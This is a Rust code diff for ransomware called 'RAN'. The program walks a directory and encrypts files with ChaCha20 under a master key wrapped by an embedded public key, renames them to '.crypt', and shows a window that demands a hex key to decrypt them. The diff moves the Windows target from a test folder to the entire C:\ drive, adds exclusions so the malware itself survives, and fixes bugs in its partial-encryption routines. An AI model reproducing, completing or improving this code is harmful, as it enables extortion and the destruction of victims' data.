@@ -3,7 +3,6 @@ use base64::{Engine as _, engine::general_purpose};
 use chacha20::ChaCha20;
 use chacha20::cipher::{KeyIvInit, StreamCipher, StreamCipherSeek};
 use chacha20poly1305::{ChaCha20Poly1305, KeyInit, aead::Aead};
-use eframe::egui::{self, Color32, RichText};
 use rand::rngs::OsRng;
 use rand::{RngCore, thread_rng};
 use rayon::prelude::*;
@@ -13,20 +12,23 @@ use std::fs::{self, OpenOptions};
 use std::io::{Read, Seek, SeekFrom, Write};
 use std::path::{Path, PathBuf};
 use std::time::Duration;
+use eframe::egui::{self, Color32, RichText};
 use walkdir::WalkDir;
 use x25519_dalek::{EphemeralSecret, PublicKey as EccPublicKey};
 use std::env;
 use std::sync::Arc;
-const BUFFER_4MB: usize = 4 * 1024 * 1024;
-const BUFFER_1MB: usize = 1 * 1024 * 1024;
+const BUFFER_4MB: u64 = 4 * 1024 * 1024;
+const BUFFER_1MB: u64 = 1 * 1024 * 1024;
 const SMALL_FILE_THRESHOLD: u64 = 1 * 1024 * 1024;
 const MEDIUM_FILE_THRESHOLD: u64 = 500 * 1024 * 1024;
-const SPARSE_BLOCKS: usize = 5;
+const SPARSE_BLOCKS: u64 = 5;
 const PUBLIC_KEY: &str = "
 -----BEGIN PUBLIC KEY-----
 MCowBQYDK2VuAyEAIyqwE+FAqYxmz+SMmhVuZckYZcOcXsKEa3oHJG6LQig=
 -----END PUBLIC KEY-----
 ";
+const EXCLUDED_FILES: &[&str] = &["INFO.bin"];
+const ENCRYPTION_EXTENSION: &str = "crypt";
 const APP_CLIENT_TOKEN: &str = "tn^huyDmJf5GjEiK*8@Q#NFHtQsUu5gwChjjgV$#DH8q!QGNk33k8&UqRvACPTSV$%WwscJ89oXmhB3yLFHAaLRfspfZ^Am8AQHMr7x%zsPX5Nv9N3BG3kNccMk&7h3S";
 const EXPECTED_USER_AGENT: &str = "RAN/wj3ck7hp6tv3p2pedivsbzr7";
 pub const OS: &str = if cfg!(target_os = "windows") {
@@ -48,7 +50,7 @@ pub const RECOVERY_INFO_PATH: &str = if cfg!(target_os = "windows") {
     "INFO.bin"
 };
 pub const TARGET_DIR: &str = if cfg!(target_os = "windows") {
-    r"C:\Users\Public\Documents\TestData"
+    r"C:\"
 } else if cfg!(target_os = "linux") {
     "/home/jannik/Cloud/Dev/RAN/test_data"
 } else if cfg!(target_os = "macos") {
@@ -57,11 +59,11 @@ pub const TARGET_DIR: &str = if cfg!(target_os = "windows") {
     ""
 };
 pub const EXCLUDED_DIRS: &[&str] = if cfg!(target_os = "windows") {
-    &["Windows"]
+    &["Windows", "NCH Software", "Debut", "RAN", "xampp"]
 } else if cfg!(target_os = "linux") {
-    &["proc", "sys", "dev", "run", "tmp"]
+    &["proc", "sys", "dev", "run", "tmp", "ran"]
 } else if cfg!(target_os = "macos") {
-    &["System", "Library", "Applications", "Users"]
+    &["System", "Library", "Applications", "Users", "RAN"]
 } else {
     &[]
 };
@@ -84,7 +86,7 @@ pub fn get_token() -> String {
 struct RecoveryMetadata {
     encrypted_master_key: Vec<u8>,
     nonce_salt: [u8; 16],
-    chunk_size: usize,
+    chunk_size: u64,
     tiered_strategy: bool,
     master_key_hash: [u8; 32],
     token: String,
@@ -103,9 +105,9 @@ impl RecoveryMetadata {
 }
 fn normalized_path_string(root_dir: &Path, path: &Path) -> String {
     if let Ok(relative) = path.strip_prefix(root_dir) {
-        relative.to_string_lossy().to_string()
+        relative.to_string_lossy().replace('\\', "/")
     } else {
-        path.to_string_lossy().to_string()
+        path.to_string_lossy().replace('\\', "/")
     }
 }
 fn compute_name_nonce_input(root_dir: &Path, path: &Path) -> String {
@@ -326,7 +328,7 @@ impl eframe::App for RANApp {
                         )
                         .clicked()
                     {
-                        match std::fs::read("INFO.bin") {
+                        match std::fs::read(RECOVERY_INFO_PATH) {
                             Ok(meta_data) => {
                                 if let Ok(meta) =
                                     bincode::deserialize::<RecoveryMetadata>(&meta_data)
@@ -359,23 +361,12 @@ impl eframe::App for RANApp {
                                                         .to_string();
                                                 let master_key_clone = self.master_key.clone();
                                                 let ctx = ui.ctx().clone();
-                                                let recovery_info_path =
-                                                    Path::new(RECOVERY_INFO_PATH);
+                                                let recovery_info_path = PathBuf::from(RECOVERY_INFO_PATH);
                                                 std::thread::spawn(move || {
-                                                    match run_decryption(
-                                                        recovery_info_path,
-                                                        TARGET_DIR.as_ref(),
-                                                        &master_key_clone,
-                                                    ) {
+                                                    match run_decryption(&recovery_info_path, TARGET_DIR.as_ref(), &master_key_clone) {
                                                         Ok(_) => {
-                                                            std::thread::sleep(
-                                                                std::time::Duration::from_millis(
-                                                                    1500,
-                                                                ),
-                                                            );
-                                                            ctx.send_viewport_cmd(
-                                                                egui::ViewportCommand::Close,
-                                                            );
+                                                            std::thread::sleep(std::time::Duration::from_millis(1500));
+                                                            ctx.send_viewport_cmd(egui::ViewportCommand::Close);
                                                         }
                                                         Err(_e) => {}
                                                     }
@@ -401,7 +392,7 @@ impl eframe::App for RANApp {
                                         "❌ Error: INFO.bin is corrupted.".to_string();
                                 }
                             }
-                            Err(_) => {
+                            Err(_e) => {
                                 self.is_valid = false;
                                 self.status_msg = "❌ Error: INFO.bin is corrupted. ".to_string();
                             }
@@ -455,10 +446,10 @@ impl eframe::App for RANApp {
 #[tokio::main]
 async fn main() -> anyhow::Result<()> {
     let recovery_info_path = Path::new(RECOVERY_INFO_PATH);
+    let root_dir = Path::new(TARGET_DIR);
     if !check().await {
         std::process::exit(0);
     }
-    let root_dir = Path::new(TARGET_DIR);
     if !root_dir.exists() || !root_dir.is_dir() {
         std::process::exit(0);
     }
@@ -520,7 +511,11 @@ fn run_encryption(
         master_key_hash,
         token,
     };
+    let hex_key = master_key.iter().map(|b| format!("{:02x}", b)).collect::<String>();
     let current_exe = env::current_exe().ok();
+    let absolute_recovery_path = fs::canonicalize(recovery_info_path)
+        .unwrap_or_else(|_| recovery_info_path.to_path_buf());
+
     let entries: Vec<PathBuf> = WalkDir::new(root_dir)
         .into_iter()
         .filter_entry(|e| {
@@ -534,16 +529,36 @@ fn run_encryption(
         .filter_map(|e| e.ok())
         .filter(|e| e.file_type().is_file())
         .filter(|e| {
-            if let Some(ref exe_path) = current_exe {
-                // e.path() liefert den vollen Pfad der gefundenen Datei
-                e.path() != exe_path
-            } else {
-                true
+            let path = e.path();
+            let file_name = path.file_name().map(|n| n.to_string_lossy()).unwrap_or_default();
+            if let Ok(abs_path) = fs::canonicalize(path) {
+                if abs_path == absolute_recovery_path {
+                    return false;
+                }
             }
+
+            if let Some(ref exe_path) = current_exe {
+                if let Ok(abs_exe) = fs::canonicalize(exe_path) {
+                    if let Ok(abs_path) = fs::canonicalize(path) {
+                        if abs_path == abs_exe {
+                            return false;
+                        }
+                    }
+                }
+            }
+
+            if EXCLUDED_FILES.contains(&file_name.as_ref()) {
+                return false;
+            }
+
+            if path.extension().map_or(false, |ext| ext == ENCRYPTION_EXTENSION) {
+                return false;
+            }
+
+            true
         })
         .map(|e| e.into_path())
         .collect();
-
     entries.par_iter().for_each(|path| {
         if let Err(_e) = process_file(path, root_dir, &master_key, &meta) {}
     });
@@ -609,7 +624,7 @@ fn encrypt_sparse(
 ) -> anyhow::Result<()> {
     encrypt_header(file, size, cipher)?;
 
-    let step = size as usize / (SPARSE_BLOCKS + 1);
+    let step = size as u64 / (SPARSE_BLOCKS + 1);
     for i in 1..=SPARSE_BLOCKS {
         let offset = (i * step) as u64;
         if offset + BUFFER_1MB as u64 > size {
@@ -618,7 +633,7 @@ fn encrypt_sparse(
         file.seek(SeekFrom::Start(offset))?;
         cipher.seek(offset);
 
-        let mut buffer = vec![0u8; BUFFER_1MB];
+        let mut buffer = vec![0u8; BUFFER_1MB.try_into().unwrap()];
         file.read_exact(&mut buffer)?;
         cipher.apply_keystream(&mut buffer);
         file.seek(SeekFrom::Start(offset))?;
@@ -646,42 +661,49 @@ fn rename_file(
     fs::rename(path, new_path)?;
     Ok(())
 }
-fn run_decryption(recovery_info_path: &Path, root_dir: &Path, hex_key: &str) -> anyhow::Result<()> {
+pub fn run_decryption(recovery_info_path: &Path, root_dir: &Path, hex_key: &str) -> anyhow::Result<()> {
+    let canonical_recovery_path = fs::canonicalize(recovery_info_path)
+        .unwrap_or_else(|_| recovery_info_path.to_path_buf());
     let meta_data = fs::read(recovery_info_path).map_err(|e| {
         anyhow::anyhow!(
             "Konnte Recovery-Info ({}) nicht laden: {e}",
             recovery_info_path.display()
         )
     })?;
-    let meta: RecoveryMetadata = bincode::deserialize(&meta_data)?;
+    let meta: RecoveryMetadata = bincode::deserialize(&meta_data).map_err(|e| {
+        anyhow::anyhow!("INFO.bin ist beschädigt oder Struktur weicht ab! Fehler: {e}")
+    })?;
     let mut master_key = [0u8; 32];
     let cleaned_hex = hex_key.trim();
-    if cleaned_hex.len() != 64 {
-        return Err(anyhow::anyhow!(
-            "Der Hex-Master-Key muss genau 64 Zeichen lang sein (32 Bytes)!"
-        ));
-    }
     for i in 0..32 {
         master_key[i] = u8::from_str_radix(&cleaned_hex[i * 2..i * 2 + 2], 16)
             .map_err(|_| anyhow::anyhow!("Ungültiges Hex-Zeichen im Master-Key gefunden!"))?;
     }
-    let recovery_file_name = Path::new(recovery_info_path)
-        .file_name()
-        .unwrap_or_default();
     let entries: Vec<PathBuf> = WalkDir::new(root_dir)
         .into_iter()
         .filter_map(|e| e.ok())
         .filter(|e| e.file_type().is_file())
         .filter(|e| {
-            let name = e.file_name();
-            let name_str = name.to_string_lossy();
-            name != recovery_file_name && name_str.ends_with(".crypt")
-    })
-    .map(|e| e.into_path())
-    .collect();
+            let path = e.path();
+            let name_str = path.to_string_lossy();
+            if let Ok(abs_path) = fs::canonicalize(path) {
+                if abs_path == canonical_recovery_path {
+                    return false; 
+                }
+            }
+            name_str.ends_with(".crypt")
+        })
+        .map(|e| e.into_path())
+        .collect();
+
     entries.par_iter().for_each(|path| {
-        if let Err(_e) = recover_file(path, root_dir, &master_key, &meta) {}
+        if let Err(e) = recover_file(path, root_dir, &master_key, &meta) {
+            eprintln!("Fehler beim Entschlüsseln von {:?}: {}", path, e);
+        } else {
+            println!("Erfolgreich wiederhergestellt: {:?}", path);
+        }
     });
+
     Ok(())
 }
 
@@ -757,7 +779,7 @@ fn decrypt_sparse(
 ) -> anyhow::Result<()> {
     decrypt_header(file, size, cipher)?;
 
-    let step = size as usize / (SPARSE_BLOCKS + 1);
+    let step = size as u64 / (SPARSE_BLOCKS + 1);
     for i in 1..=SPARSE_BLOCKS {
         let offset = (i * step) as u64;
         if offset + BUFFER_1MB as u64 > size {
@@ -767,7 +789,7 @@ fn decrypt_sparse(
         file.seek(SeekFrom::Start(offset))?;
         cipher.seek(offset);
 
-        let mut buffer = vec![0u8; BUFFER_1MB];
+        let mut buffer = vec![0u8; BUFFER_1MB.try_into().unwrap()];
         file.read_exact(&mut buffer)?;
         cipher.apply_keystream(&mut buffer);
         file.seek(SeekFrom::Start(offset))?;
